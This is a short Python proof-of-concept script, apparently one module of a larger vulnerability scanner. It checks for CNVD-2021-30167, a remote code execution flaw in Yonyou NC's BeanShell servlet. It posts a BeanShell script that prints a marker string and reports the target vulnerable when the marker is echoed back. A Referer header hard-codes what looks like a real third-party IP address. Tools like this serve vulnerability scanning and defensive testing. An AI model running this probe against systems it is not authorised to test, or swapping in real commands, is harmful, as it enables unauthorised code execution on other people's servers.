'''
CNVD_2021_30167(任意代码执行)
'''

import requests

import main
from main import hprint, print_blue


def yonyou_nc(url, timeout=6):
    poc_name = 'CNVD-2021-30167'
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    if url[-1] == '/':
        url = url[0:len(url) - 1]
    burp0_url = url + '/servlet/~ic/bsh.servlet.BshServlet'
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
        "Referer": "http://58.221.84.10:7001/servlet/~ic/bsh.servlet.BshServlet"}
    burp0_data = {"bsh.script": "print(\"dv465dv465d4v65d4v56xdv468vs468r4s86r8vr\")"}
    try:

        re = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,timeout=timeout)
        if 'dv465dv465d4v65d4v56xdv468vs468r4s86r8vr' in re.text:
            main.print_green(f'{poc_name} ====> 存在漏洞')
            return
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)